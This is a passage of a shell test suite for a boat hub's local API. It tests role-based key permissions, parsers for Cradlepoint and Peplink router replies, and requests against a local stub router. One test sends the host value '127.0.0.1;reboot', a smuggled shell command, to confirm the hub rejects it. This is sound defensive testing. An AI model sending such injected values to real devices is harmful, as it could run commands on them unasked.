check "role: status counts the synced member keys" "1" "$(body_of "$r" | grep -c '"keysSynced":4')"
r=$(mapi "$K_MON" POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"durationSecs\":600}")
check "role: a MONITOR key is REFUSED an open (403)" "403" "$(status_of "$r")"
check "role: and the valve was not touched" "no" "$([ -f "$T/lt/$DEV" ] && echo yes || echo no)"
r=$(mapi "$K_MON" POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}")
check "role: a MONITOR key is refused a close too — every control verb is control-grade" "403" "$(status_of "$r")"
r=$(mapi "$K_CTL" POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"durationSecs\":600}")
check "role: a CONTROL key may OPEN the valve" "200" "$(status_of "$r")"
check "role: and the run is recorded as the hub's" "normal hub" "$(. "$T/lt/$DEV"; echo "$mode $prov")"
r=$(mapi "$K_CTL" POST /config '{"name":"Mine"}')
check "role: a CONTROL key may not change settings" "403" "$(status_of "$r")"

# 🔴 THE OWNER'S RULING OF 2026-09-25, and the tests that would have FAILED the day before it:
# "owner and co-owner only for bridge mode as with all router and hub settings". A Limited Admin keeps
# every READ and keeps device control; it loses every settings CHANGE.
r=$(mapi "$K_ADM" POST /config '{"name":"Mine"}')
check "role: an ADMIN key may NO LONGER change hub settings (owner ruling)" "403" "$(status_of "$r")"
check "role: and the refusal never rewrote the conf" "1" "$(grep -c '^VID="v_test"' "$T/conf.members")"
r=$(mapi "$K_ADM" POST /net/lan '{"ip":"10.0.0.1"}')
check "role: an ADMIN key may NO LONGER change the router's LAN" "403" "$(status_of "$r")"
r=$(mapi "$K_ADM" POST /net/mode '{"mode":"bridge"}')
check "role: an ADMIN key may NO LONGER bridge the router (the route that prompted the ruling)" "403" "$(status_of "$r")"
r=$(mapi "$K_ADM" POST /reboot "")
check "role: an ADMIN key may NO LONGER reboot the router" "403" "$(status_of "$r")"
# …and what it KEEPS, so this is a tightening and not a lockout. Reads and control are untouched.
r=$(mapi "$K_ADM" GET /status "")
check "role: an ADMIN key still reads status" "200" "$(status_of "$r")"
r=$(mapi "$K_ADM" POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}")
check "role: an ADMIN key still OPERATES the valve (control is not a setting)" "200" "$(status_of "$r")"
# The owner keeps everything, which is the other half of "this is a tightening": if the bar had moved
# too far, this would be a 403 and the vessel would have nobody who could change a setting at all.
r=$(mapi "$K_OWN" POST /config '{"name":"Mine"}')
check "role: an OWNER key still changes settings" "200" "$(status_of "$r")"
r=$(mapi "$K_CTL" POST /clear "")
check "role: a CONTROL key may not clear the hub (administer is co-owner+)" "403" "$(status_of "$r")"
check "role: a refusal never rewrote the conf" "1" "$(grep -c '^VID="v_test"' "$T/conf.members")"
r=$(mapi "$K_OWN" GET /logs "")
check "role: an OWNER key passes control" "200" "$(status_of "$r")"
r=$(mapi "$K_CTL2" GET /status "")
check "role: an unknown key is 401" "401" "$(status_of "$r")"
check "role: and asks the collector to sync early (a member who just joined)" "yes" "$([ -f "$T/keys-stale" ] && echo yes || echo no)"
rm -f "$T/keys-stale"
r=$(mapi "short_key_123456" GET /status "")
check "role: a key not shaped like a member key does not ring the sync" "401 no" "$(status_of "$r") $([ -f "$T/keys-stale" ] && echo yes || echo no)"

# REMOVED: the worker's next set omits the control member; ROTATED: the monitor's key is replaced.
MK_CODE=200 MK_BODY=$(member_json "$K_OWN owner" "$K_CTL2 monitor") sync_keys
r=$(mapi "$K_CTL" POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}")
check "revoke: a REMOVED member's key is refused on the next sync" "401" "$(status_of "$r")"
r=$(mapi "$K_MON" GET /status "")
check "rotate: the monitor's OLD key stops working" "401" "$(status_of "$r")"
r=$(mapi "$K_CTL2" GET /status "")
check "rotate: the ROTATED key is picked up" "200" "$(status_of "$r")"
r=$(mapi "$K_CTL2" POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}")
check "rotate: and carries its role, not the old key's (monitor still cannot close)" "403" "$(status_of "$r")"

# MGMT_KEY is still owner-grade during rollout, alongside the member set.
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}")
check "rollout: the router's MGMT_KEY still drives the valve" "200" "$(status_of "$r")"
r=$(api GET /status "" HTTP_AUTHORIZATION="Bearer $K_OWN")
check "rollout: a member key works on a router that ALSO has a MGMT_KEY" "200" "$(status_of "$r")"
r=$(api GET /status "")
check "rollout: keysSynced counts the member set plus the MGMT_KEY" "1" "$(body_of "$r" | grep -c '"keysSynced":3')"
rm -f "$T/keys"
r=$(mapi "$K_OWN" GET /status "")
check "keys: with neither a set nor a MGMT_KEY the door is 503, not open" "503" "$(status_of "$r")"
cp "$T/keys.before" "$T/keys"; cp "$T/conf" "$T/conf.clear"
api POST /clear "" BRVG_HUB_LITE_CONF="$T/conf.clear" >/dev/null
check "clear: forgetting the vessel forgets its member set" "no" "$([ -f "$T/keys" ] && echo yes || echo no)"
echo ""
echo "# --- managed routers (routers.sh, owner D2): parsers pinned to the daemon's fixtures -----------"
# Every fixture below is the one daemon/src/routers.rs or peplink.rs pins, so the two tiers are
# checked against the same captures. flat() = the transport's unwrap, without the network.
flat_cp() { printf '%s' "$1" | rt_flat | rt_unwrap ncos; }
flat_pl() { printf '%s' "$1" | rt_flat | rt_unwrap peplink; }
line() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1 == k { print $2 }'; }
RT_BENCH='{"success":true,"data":{"mdm-1a2b":{"info":{"type":"mdm"},"status":{"connection_state":"connected","ipinfo":{"ip_address":"100.64.3.9"}},"diagnostics":{"CARRID":"Verizon ","HOMECARRID":"Verizon","SERDIS":"LTE","DBM":"-71","RSRP":"-101","RSRQ":"-12","SINR":"7.4","PIN_STATUS":"READY","MDN":"5551234567"},"stats":{"in":1234567,"out":234567}},"mdm-3c4d":{"info":{"type":"mdm"},"status":{"connection_state":"unplugged"},"diagnostics":{"PIN_STATUS":"NOSIM","RSRP":""}},"ethernet-wan":{"info":{"type":"ethernet"},"status":{"connection_state":"disconnected"}}}}'
RT_RULES2='[{"priority":1,"trigger_name":"Ethernet","trigger_string":"type|is|ethernet"},{"priority":2,"trigger_name":"LTE-only Modems","trigger_string":"type|is|mdm%tech|is|lte"},{"priority":2.5,"trigger_name":"LTE/3G Multi-mode Modems","trigger_string":"type|is|mdm%tech|is|lte/3g"},{"priority":5,"trigger_name":"3G-only Modems","trigger_string":"type|is|mdm%tech|is|3g"},{"modem":{"apn_mode":"manual","manual_apn":"mw01.VZWSTATIC"},"priority":2.25,"trigger_name":"Modem-3a201cd3","trigger_string":"type|is|mdm%tech|is|lte/3g%uid|is|3a201cd3"}]'
# The owner's Balance One (fw 8.5.5 build 5824), GET https://172.31.0.1/api/info.firmware, captured
# live from the boat LAN 2026-09-13 — verbatim, whitespace included. No auth; nothing written.
RT_PL_FW_LIVE='{
  "stat": "ok",
  "response": {
    "1": {
      "version": "8.5.5 build 5824",
      "bootable": true,
      "inUse": true
    },
    "order": [
      1
    ]
  }
}'

# (Built here, not inline: macOS bash 3.2 — the Mac's sh — mis-parses \" inside "$( … )".)
RT_RULES2_BODY="{\"success\":true,\"data\":$RT_RULES2}"
s=$(flat_cp "$RT_BENCH" | rt_cp_status)
check "cp modem: the CONNECTED SIM of a dual-SIM unit, strings normalized (CBA850 capture)" \
  "ok|Verizon|LTE|-71|-101|-12|7.4|1|100.64.3.9|234567|1234567" \
  "$(for k in sim carrier mode rssi rsrp rsrq sinr connected ip txBytes rxBytes; do printf '%s|' "$(line "$s" "m.$k")"; done | sed 's/|$//')"
check "cp wan: classified by uid prefix" "lte 1 100.64.3.9" "$(line "$s" w.wan) $(line "$s" w.up) $(line "$s" w.ip)"
s=$(flat_cp '{"success":true,"data":{"mdm-x":{"status":{},"diagnostics":{"PIN_STATUS":"NOSIM","RSRP":""}}}}' | rt_cp_status)
check "cp modem: SIM absence reported honestly, an empty RSRP is no reading" "missing|" "$(line "$s" m.sim)|$(line "$s" m.rsrp)"
check "cp modem: none without a cellular entry" "" "$(flat_cp '{"success":true,"data":{"ethernet-wan":{"status":{}}}}' | rt_cp_status | grep '^m\.')"
check "cp wan: nothing connected is none/down" "none 0" "$(s=$(flat_cp '{"success":true,"data":{"ethernet-wan":{"status":{"connection_state":"disconnected"}}}}' | rt_cp_status); echo "$(line "$s" w.wan) $(line "$s" w.up)")"
check "cp wan: no entries at all is no wan" "" "$(flat_cp '{"success":true,"data":{}}' | rt_cp_status)"
s=$( { flat_cp '{"success":true,"data":{"product_name":"CBA850","mac0":"00:30:44:aa:bb:cc"}}'; flat_cp '{"success":true,"data":{"major_version":7,"minor_version":0,"patch_version":50}}' | sed 's/^D/F/'; } | rt_cp_probe)
check "cp probe: firmware triple joined, MAC kept" "CBA850 7.0.50 00:30:44:aa:bb:cc" "$(line "$s" p.model) $(line "$s" p.firmware) $(line "$s" p.mac)"
check "cp probe: nothing without a model or firmware" "" "$(flat_cp '{"success":true,"data":{}}' | rt_cp_probe)"
check "cp apn: the per-modem rule (index 4, manual mw01.VZWSTATIC) beats the first class rule (#135)" \
  "4	manual	mw01.VZWSTATIC" "$(flat_cp "$RT_RULES2_BODY" | rt_cp_apn)"
check "cp apn: a plain mdm rule with a modem subtree" "1	manual	vzwinternet" \
  "$(flat_cp '{"success":true,"data":[{"trigger_string":"type|is|ethernet","trigger_name":"Ethernet"},{"trigger_string":"type|is|mdm","modem":{"apn_mode":"manual","manual_apn":"vzwinternet"}}]}' | rt_cp_apn)"
check "cp apn: NCOS default is the app's auto, and a stale manual name is dropped" "0	auto	" \
  "$(flat_cp '{"success":true,"data":[{"trigger_string":"type|is|mdm%uid|is|x","modem":{"apn_mode":"default","manual_apn":"stale"}}]}' | rt_cp_apn)"
check "cp apn: no per-modem rule yet — the first class rule, automatic" "1	auto	" \
  "$(flat_cp '{"success":true,"data":[{"trigger_string":"type|is|ethernet"},{"trigger_string":"type|is|mdm%tech|is|lte"}]}' | rt_cp_apn)"
check "cp apn: no modem rule at all is nothing" "" "$(flat_cp '{"success":true,"data":[{"trigger_string":"type|is|ethernet"}]}' | rt_cp_apn)"
check "cp envelope: a refusal's string reason" "!bad value" "$(flat_cp '{"success":false,"reason":"bad value"}')"
check "cp envelope: a refusal's OBJECT data is carried, not flattened to a generic line" \
  '!the router refused the request: {"apn_mode":"invalid choice"}' "$(flat_cp '{"success":false,"data":{"apn_mode":"invalid choice"}}')"
check "cp envelope: a bare refusal" "!the router refused the request" "$(flat_cp '{"success":false}')"
check "cp envelope: not an object is not JSON we can use" "!the router did not answer with JSON" "$(flat_cp '"nope"')"
check "cp envelope: not JSON at all" "!the router did not answer with JSON" "$(flat_cp '<html>login</html>')"
check "cp envelope: success unwraps data" "D/a	n	1" "$(flat_cp '{"success":true,"data":{"a":1}}' | tail -n 1)"
s=$(flat_cp '{"success":true,"data":{"fix":{"latitude":{"degree":41,"minute":29,"second":34.52},"longitude":{"degree":-81,"minute":41,"second":39.5}}}}' | rt_cp_gps)
check "cp gps: DMS with the sign on degree (CBA850 capture shape)" "41.49292222 -81.69430556" "$(line "$s" f.lat) $(line "$s" f.lon)"
check "cp gps: the 0,0 placeholder is no fix" "" "$(flat_cp '{"success":true,"data":{"fix":{"latitude":0,"longitude":0}}}' | rt_cp_gps)"

check "pl envelope: fail carries the message" "!Invalid password" "$(flat_pl '{"stat":"fail","message":"Invalid password"}')"
check "pl envelope: a bare fail" "!the router refused the request" "$(flat_pl '{"stat":"fail"}')"
check "pl envelope: neither ok nor fail" "!unexpected response from the router" "$(flat_pl '{"nothing":true}')"
check "pl expired: code 401" "yes" "$(printf '%s' '{"stat":"fail","code":401,"message":"Unauthorized"}' | rt_flat | rt_pl_expired && echo yes || echo no)"
check "pl expired: 'Please login first'" "yes" "$(printf '%s' '{"stat":"fail","message":"Please login first"}' | rt_flat | rt_pl_expired && echo yes || echo no)"
check "pl expired: the LIVE Balance One's answer to a status read with no session (HTTP 200, 2026-09-13)" "yes" \
  "$(printf '{\n  "stat": "fail",\n  "code": 401,\n  "message": "Unauthorized"\n}' | rt_flat | rt_pl_expired && echo yes || echo no)"
check "pl expired: a wrong password is NOT an expired session" "no" "$(printf '%s' '{"stat":"fail","message":"Invalid password"}' | rt_flat | rt_pl_expired && echo yes || echo no)"
s=$(flat_pl '{"stat":"ok","response":{"productName":"Balance One","firmwareVersion":"8.5.2","mac":"00:11:22:33:44:55"}}' | rt_pl_probe)
check "pl probe: model, firmware, mac" "Balance One|8.5.2|00:11:22:33:44:55" "$(line "$s" p.model)|$(line "$s" p.firmware)|$(line "$s" p.mac)"
check "pl probe: identity nested under device" "Peplink Balance One" "$(flat_pl '{"stat":"ok","response":{"device":{"model":"Peplink Balance One","firmwareVersion":"8.5.5 build 5824"}}}' | rt_pl_probe | awk -F'\t' '$1=="p.model"{print $2}')"
check "pl probe: nothing usable is nothing" "" "$(flat_pl '{"stat":"ok","response":{"something":1}}' | rt_pl_probe)"
check "pl firmware: the in-use image (8.5 fixture)" "8.5.5 build 5824" \
  "$(flat_pl '{"stat":"ok","response":{"1":{"version":"8.5.4 build 5700","bootable":true,"inUse":false},"2":{"version":"8.5.5 build 5824","bootable":true,"inUse":true},"order":[1,2]}}' | rt_pl_firmware)"
check "pl firmware: the LIVE Balance One answer, verbatim (172.31.0.1, 2026-09-13)" "8.5.5 build 5824" "$(flat_pl "$RT_PL_FW_LIVE" | rt_pl_firmware)"
check "pl firmware: no image in use is nothing" "" "$(flat_pl '{"stat":"ok","response":{"order":[]}}' | rt_pl_firmware)"
s=$(flat_pl '{"stat":"ok","response":{"1":{"name":"WAN 1","type":"ethernet","message":"Connected","statusLed":"green","ip":"10.0.0.5"},"2":{"name":"Cellular","type":"cellular","message":"Disconnected","statusLed":"red"},"order":[1,2]}}' | rt_pl_status)
check "pl wan: the active uplink, classified" "wired 1 10.0.0.5" "$(line "$s" w.wan) $(line "$s" w.up) $(line "$s" w.ip)"
check "pl wan: cellular is lte" "lte" "$(flat_pl '{"response":{"1":{"type":"cellular","message":"Connected","statusLed":"green"}},"stat":"ok"}' | rt_pl_status | awk -F'\t' '$1=="w.wan"{print $2}')"
check "pl wan: wifi is repeater" "repeater" "$(flat_pl '{"stat":"ok","response":{"1":{"type":"wifi","statusLed":"green"}}}' | rt_pl_status | awk -F'\t' '$1=="w.wan"{print $2}')"
check "pl wan: nothing up is none" "none" "$(flat_pl '{"stat":"ok","response":{"1":{"type":"cellular","statusLed":"red"}}}' | rt_pl_status | awk -F'\t' '$1=="w.wan"{print $2}')"
s=$(flat_pl '{"stat":"ok","response":{"1":{"type":"ethernet","statusLed":"green"},"2":{"type":"cellular","message":"Connected","statusLed":"green","ip":"100.64.1.2","cellular":{"simStatus":"SIM card is ready","carrier":"T-Mobile","dataTechnology":"LTE","signal":{"rssi":-70,"rsrp":-95,"sinr":9}}}}}' | rt_pl_status)
check "pl modem: the nested cellular block" "ok|T-Mobile|LTE|-70|-95||9|1|100.64.1.2|" \
  "$(for k in sim carrier mode rssi rsrp rsrq sinr connected ip txBytes; do printf '%s|' "$(line "$s" "m.$k")"; done | sed 's/|$//')"
check "pl modem: no SIM" "missing" "$(flat_pl '{"stat":"ok","response":{"1":{"cellular":{"simStatus":"No SIM card detected"}}}}' | rt_pl_status | awk -F'\t' '$1=="m.sim"{print $2}')"
check "pl modem: none on a model with no modem (a Balance One)" "" "$(flat_pl '{"stat":"ok","response":{"1":{"type":"ethernet","statusLed":"green"}}}' | rt_pl_status | grep '^m\.')"
s=$(flat_pl '{"stat":"ok","response":{"gps":true,"location":{"latitude":37.8044,"longitude":-122.2712}}}' | rt_pl_gps)
check "pl gps: the gps flag beside the fix" "1 37.8044 -122.2712" "$(line "$s" gpsEnabled) $(line "$s" f.lat) $(line "$s" f.lon)"
check "pl gps: no hardware is gps off, no fix" "gpsEnabled	0" "$(flat_pl '{"stat":"ok","response":{"gps":false}}' | rt_pl_gps)"
check "pl base: https unless :80" "https://192.168.50.1 https://192.168.50.1 http://192.168.50.1 https://192.168.50.1:8443" \
  "$(rt_pl_base 192.168.50.1 0) $(rt_pl_base 192.168.50.1 443) $(rt_pl_base 192.168.50.1 80) $(rt_pl_base 192.168.50.1 8443)"

s=$( { flat_cp "$RT_BENCH" | rt_cp_status; printf 'p._\t1\np.model\tCBA850\np.firmware\t7.0.50\n'; } | HUB_LITE_VERSION=0.16.0 rt_params 512)
check "measurement: the daemon's modem_params names and order (= push_modem's)" \
  "up=1&mode=LTE&rssi=-71&rsrp=-101&sinr=7.4&rsrq=-12&carrier=Verizon&sim=ok&dataMb=1&wan=lte&ip=100.64.3.9&model=CBA850&fw=7.0.50&av=hub-lite-0.16.0&wanKb_cellular=512" "$s"
s=$(flat_pl '{"stat":"ok","response":{"1":{"type":"cellular","statusLed":"green","ip":"100.64.1.2","cellular":{"simStatus":"ready","carrier":"T-Mobile","dataTechnology":"LTE","signal":{"rsrp":-95,"sinr":9}}}}}' | rt_pl_status | { cat; printf 'p._\t1\np.firmware\t8.5.5 build 5824\n'; } | HUB_LITE_VERSION=0.16.0 rt_params "")
check "measurement: vendor-blind — a Peplink has no counters, so no dataMb, and a spaced fw is encoded" \
  "up=1&mode=LTE&rsrp=-95&sinr=9&carrier=T-Mobile&sim=ok&wan=lte&ip=100.64.1.2&fw=8.5.5%20build%205824&av=hub-lite-0.16.0" "$s"
check "measurement: nothing to report without a modem" "" "$(printf 'w.wan\twired\n' | rt_params "")"
check "kb delta: none on the first sample" "" "$(rt_kb_delta "" "10 10")"
check "kb delta: KB since the last poll" "3" "$(rt_kb_delta "1024 2048" "2048 4096")"
check "kb delta: a counter reset is never charged" "" "$(rt_kb_delta "5000 5000" "10 10")"
check "read scrub: secrets blanked, objects under secret-looking keys descended, compact JSON" \
  '{"system":{"admin":{"password":"•••","username":"admin"}},"wlan":{"radio":[{"bss":[{"ssid":"Boat","wpapsk":"•••","enabled":true}]}]},"vpn":{"ipsec":{"shared_key":"•••"},"sections":[]},"snmp":{"community":"•••"},"nested":{"passwordPolicy":{"min":8}}}' \
  "$(printf '%s' '{"success":true,"data":{"system":{"admin":{"password":"$1$abc","username":"admin"}},"wlan":{"radio":[{"bss":[{"ssid":"Boat","wpapsk":"hunter2","enabled":true}]}]},"vpn":{"ipsec":{"shared_key":"k"},"sections":[]},"snmp":{"community":"public"},"nested":{"passwordPolicy":{"min":8}}}}' | rt_flat J data)"
check "flat: escapes decode, a bad document ends in the error line" "a	s	x\"y|	!	" \
  "$(printf '%s' '{"a":"x\"y"}' | rt_flat | tail -n 1)|$(printf '%s' '{"a":' | rt_flat | tail -n 1)"

echo ""
echo "# --- managed routers: the door, against a stub router on 127.0.0.1 (real curl, nc) -----------"
if ! command -v nc >/dev/null 2>&1; then
  echo "FAIL - routers stub: nc is required for the stub-router tests"; fails=$((fails + 1))
else
RP=$(( 20000 + $$ % 20000 ))
RS="$T/rstub"; mkdir -p "$RS"; echo 0 > "$RS/logins"; printf 'manual\tmw01.VZWSTATIC\n' > "$RS/apn"; : > "$RS/log"
printf '%s' "$RT_BENCH" > "$RS/devices"
printf '%s' "$RT_RULES2" | sed 's/"apn_mode":"manual","manual_apn":"mw01.VZWSTATIC"/"apn_mode":"@MODE@","manual_apn":"@APN@"/' > "$RS/rules"
cat > "$RS/h.sh" <<'STUB'
#!/bin/sh
# One HTTP request on stdin → one answer on stdout. A Cradlepoint (admin:s"e\cret) and a Peplink
# (admin:secret, cookie sessions; the FIRST session is treated as expired, fw 8.5 has no model
# endpoint) on the same port — their paths do not overlap.
IFS= read -r rl; rl=$(printf '%s' "$rl" | tr -d '\r'); m=${rl%% *}; p=${rl#* }; p=${p%% *}
auth=""; cookie=""; len=0
while IFS= read -r h; do
  h=$(printf '%s' "$h" | tr -d '\r'); [ -z "$h" ] && break
  case "$h" in [Aa]uthorization:*) auth=${h#*: } ;; [Cc]ookie:*) cookie=${h#*: } ;; [Cc]ontent-[Ll]ength:*) len=${h#*: } ;; esac
done
body=""; [ "$len" -gt 0 ] && body=$(dd bs=1 count="$len" 2>/dev/null)
printf '%s %s|%s|%s\n' "$m" "$p" "$cookie" "$body" >> "$RS/log"
hdr=""; code="200 OK"
good="Basic $(printf 'admin:s"e\\cret' | base64)"
case "$m $p" in
  "POST /api/login")
    case "$body" in
      '{"username":"admin","password":"secret"}') n=$(( $(cat "$RS/logins") + 1 )); echo "$n" > "$RS/logins"
        hdr="Set-Cookie: bauth=s$n; Path=/; HttpOnly\r\n"; out='{"stat":"ok","response":{"permission":{"GET":true}}}' ;;
      *) out='{"stat":"fail","message":"Invalid password"}' ;;
    esac ;;
  "GET /api/status.system.info")
    case "$cookie" in *bauth=s1*|'') out='{"stat":"fail","code":401,"message":"Unauthorized"}' ;; *) out='{"stat":"fail","code":404,"message":"API not found"}' ;; esac ;;
  "GET /api/status.wan.connection")
    case "$cookie" in *bauth=s[2-9]*) out='{"stat":"ok","response":{"1":{"name":"WAN 1","type":"ethernet","message":"Connected","statusLed":"green","ip":"10.0.0.2"},"order":[1]}}' ;; *) out='{"stat":"fail","code":401,"message":"Unauthorized"}' ;; esac ;;
  "GET /api/info.firmware") out='{"stat":"ok","response":{"1":{"version":"8.5.5 build 5824","bootable":true,"inUse":true},"order":[1]}}' ;;
  "GET /api/info.location") out='{"stat":"ok","response":{"gps":false}}' ;;
  *)
    if [ "$auth" != "$good" ]; then code="401 Unauthorized"; out='{"success":false,"reason":"unauthorized"}'
    else
      apn_mode=$(cut -f1 "$RS/apn"); apn_name=$(cut -f2 "$RS/apn")
      case "$m $p" in
        "GET /api/status/product_info") out='{"success":true,"data":{"product_name":"CBA850","mac0":"00:30:44:aa:bb:cc"}}' ;;
        "GET /api/status/fw_info") out='{"success":true,"data":{"major_version":7,"minor_version":0,"patch_version":50}}' ;;
        "GET /api/status/wan/devices") out=$(cat "$RS/devices") ;;
        "GET /api/config/system/gps/enabled") out='{"success":true,"data":false}' ;;
        "PUT /api/config/system/gps/enabled") out='{"success":true,"data":true}' ;;
        "GET /api/status/gps") out='{"success":true,"data":{"fix":{"latitude":{"degree":41,"minute":29,"second":34.52},"longitude":{"degree":-81,"minute":41,"second":39.5},"accuracy":5}}}' ;;
        "GET /api/config/wan/rules2")
          out='{"success":true,"data":'$(sed -e "s/@MODE@/$apn_mode/" -e "s/@APN@/$apn_name/" "$RS/rules")'}' ;;
        "PUT /api/config/wan/rules2/4/modem/manual_apn")
          v=$(printf '%s' "$body" | sed 's/^data=%22//; s/%22$//'); printf '%s\t%s\n' "$apn_mode" "$v" > "$RS/apn"; out='{"success":true,"data":"ok"}' ;;
        "PUT /api/config/wan/rules2/4/modem/apn_mode")
          case "$body" in
            data=%22manual%22) printf 'manual\t%s\n' "$apn_name" > "$RS/apn"; out='{"success":true,"data":"manual"}' ;;
            data=%22default%22) printf 'default\t%s\n' "$apn_name" > "$RS/apn"; out='{"success":true,"data":"default"}' ;;
            *) out='{"success":false,"data":{"apn_mode":"invalid choice"}}' ;;
          esac ;;
        "PUT /api/config/wan/rules2/4/modem") out='{"success":false,"data":{"apn_mode":"not a leaf"}}' ;;
        "PUT /api/control/system") out='{"success":true,"data":null}' ;;
        "GET /api/config/system/admin") out='{"success":true,"data":{"username":"admin","password":"$1$hash"}}' ;;
        *) code="404 Not Found"; out='{"success":false,"reason":"no such path"}' ;;
      esac
    fi ;;
esac
printf "HTTP/1.1 %s\r\nContent-Type: application/json\r\nContent-Length: %s\r\n${hdr}Connection: close\r\n\r\n%s" "$code" "${#out}" "$out"
STUB
rm -f "$RS/fifo"; mkfifo "$RS/fifo"
( while [ ! -f "$RS/stop" ]; do nc -l 127.0.0.1 "$RP" < "$RS/fifo" | RS="$RS" sh "$RS/h.sh" > "$RS/fifo"; done ) >/dev/null 2>&1 &
RSTUB_PID=$!
_w=0; until curl -s -o /dev/null "http://127.0.0.1:$RP/ready" 2>/dev/null || [ "$_w" -ge 50 ]; do sleep 0.1; _w=$((_w + 1)); done
: > "$RS/log"

# The door with the REAL curl (the CGI shim above answers like a LinkTap gateway) and a routers store
# of our own; routers.sh is found through BRVG_HUB_LITE_ROUTERS like every other path here.
RCONF="$T/routers.conf"; RDIR="$T/routers.state"; RLOG="$T/routers.log"; : > "$RLOG"
rapi() { api "$@" PATH="$PATH" BRVG_HUB_LITE_ROUTERS_CONF="$RCONF" BRVG_ROUTERS_STATE="$RDIR" BRVG_RT_LOG="$RLOG" RT_PL_BASE="http://127.0.0.1:$RP"; }
CPW='s\"e\\cret'
r=$(rapi GET /status "")
check "routers door: /status claims routers when routers.sh is installed and self-tests" "1" "$(body_of "$r" | grep -c '"capabilities":\[[^]]*"routers"')"
check "routers door: /status lists none yet" "1" "$(body_of "$r" | grep -c '"routers":\[\]')"
r=$(api GET /status "" BRVG_HUB_LITE_ROUTERS="$T/absent")
check "routers door: no routers.sh, no routers capability" "0" "$(body_of "$r" | grep -c '"capabilities":\[[^]]*"routers"')"
r=$(api POST /routers '{"action":"refresh","id":"x"}' BRVG_HUB_LITE_ROUTERS="$T/absent")
check "routers door: no routers.sh, no route (a 404, like a hub too old to know it)" "404" "$(status_of "$r")"
r=$(rapi GET /routers "")
check "routers door: GET lists an empty store" '{"routers":[]}' "$(body_of "$r")"
r=$(rapi POST /routers '{"action":"refresh","id":"x"}' HTTP_AUTHORIZATION="")
check "routers door: 401 without the key" "401" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":')
check "routers door: a broken body is 422" "422" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"probe","vendor":"starlink","host":"192.168.100.1"}')
check "routers door: no Starlink on a hub-lite (D2)" "422 this hub cannot manage a 'starlink' router yet" "$(status_of "$r") $(body_of "$r" | sed -n 's/.*"error":"\(.*\)"}.*/\1/p')"
r=$(rapi POST /routers '{"action":"probe","vendor":"cradlepoint","host":"127.0.0.1;reboot","password":"x"}')
check "routers door: a host that is not a host never reaches curl" "422" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"frobnicate"}')
check "routers door: unknown action" "422" "$(status_of "$r")"

# The door goes through 0.15.1's role-aware authorize (D3), as the daemon's do_routers: refresh/read
# are control-grade, everything that signs in with an admin credential or changes the store is
# configure-grade, and listing is any member.
cp "$T/keys.before" "$T/keys"
r=$(rapi GET /routers "" HTTP_AUTHORIZATION="Bearer $K_MON")
check "routers role: a MONITOR key may list" "200" "$(status_of "$r")"
r=$(rapi POST /routers '{"action":"refresh","id":"brv_net_none"}' HTTP_AUTHORIZATION="Bearer $K_MON")
check "routers role: a MONITOR key may not refresh (control)" "403" "$(status_of "$r")"
for a in refresh read; do
  r=$(rapi POST /routers "{\"action\":\"$a\",\"id\":\"brv_net_none\"}" HTTP_AUTHORIZATION="Bearer $K_CTL")
  check "routers role: a CONTROL key passes $a (then 404: no such router)" "404" "$(status_of "$r")"
done
for a in probe add remove apn gps password reboot; do
  r=$(rapi POST /routers "{\"action\":\"$a\",\"id\":\"brv_net_none\"}" HTTP_AUTHORIZATION="Bearer $K_CTL")
  check "routers role: a CONTROL key may not $a (configure)" "403" "$(status_of "$r")"
done
r=$(rapi POST /routers '{"action":"remove","id":"brv_net_none"}' HTTP_AUTHORIZATION="Bearer $K_OWN")
check "routers role: an OWNER key passes configure (then 404)" "404" "$(status_of "$r")"
rm -f "$T/keys"

: > "$RS/log"
r=$(rapi POST /routers "{\"action\":\"probe\",\"vendor\":\"cradlepoint\",\"host\":\"127.0.0.1\",\"port\":$RP,\"password\":\"wrong\"}")
check "cp sign-in REFUSED: 502 with the owner-fixable reason" "502 the router refused the sign-in — check the admin username and password" \
  "$(status_of "$r") $(body_of "$r" | sed -n 's/.*"error":"\(.*\)"}.*/\1/p')"
r=$(rapi POST /routers "{\"action\":\"probe\",\"vendor\":\"cradlepoint\",\"host\":\"127.0.0.1\",\"port\":$RP,\"password\":\"$CPW\"}")
check "cp sign-in: Basic auth with a quote and a backslash in the password, through curl's stdin config" "200" "$(status_of "$r")"
check "cp probe: the daemon's ProbeBody" \
  '{"probe":{"model":"CBA850","firmware":"7.0.50","mac":"00:30:44:aa:bb:cc"},"modem":{"sim":"ok","carrier":"Verizon","mode":"LTE","rssi":-71,"rsrp":-101,"rsrq":-12,"sinr":7.4,"connected":true,"ip":"100.64.3.9","txBytes":234567,"rxBytes":1234567},"wan":{"wan":"lte","up":true,"ip":"100.64.3.9"},"gpsEnabled":false,"fix":{"lat":41.49292222,"lon":-81.69430556,"acc":5},"capabilities":["modem","wan","gps","gpsSwitch","apn","reboot","read","signin"]}' \
  "$(body_of "$r")"
r=$(rapi POST /routers "{\"action\":\"add\",\"id\":\"brv_net_cp1\",\"vendor\":\"cradlepoint\",\"host\":\"127.0.0.1\",\"port\":$RP,\"password\":\"$CPW\",\"agentToken\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"gpsEnabled\":true,\"gpsDevId\":\"brv_gps_cp1\",\"enabled\":true}")
check "cp add: proved and stored" "200" "$(status_of "$r")"
check "cp add: the answer is a RouterStatus with no password and no token in it" "0" "$(body_of "$r" | grep -c 'cret\|aaaaaaaaaaaaaaaa')"
check "cp add: named from the probe, flags only" '"name":"CBA850","host":"127.0.0.1"' "$(body_of "$r" | grep -o '"name":"CBA850","host":"127.0.0.1"')"
check "cp add: hasPassword/agentEnrolled/gps" '"hasPassword":true,"agentEnrolled":true,"gpsEnabled":true,"gpsDevId":"brv_gps_cp1","pollSecs":120,"enabled":true' \
  "$(body_of "$r" | grep -o '"hasPassword".*"enabled":true')"
check "cp add: the router's GNSS was switched on at the router" "1" "$(grep -c '^PUT /api/config/system/gps/enabled|.*|data=true' "$RS/log")"
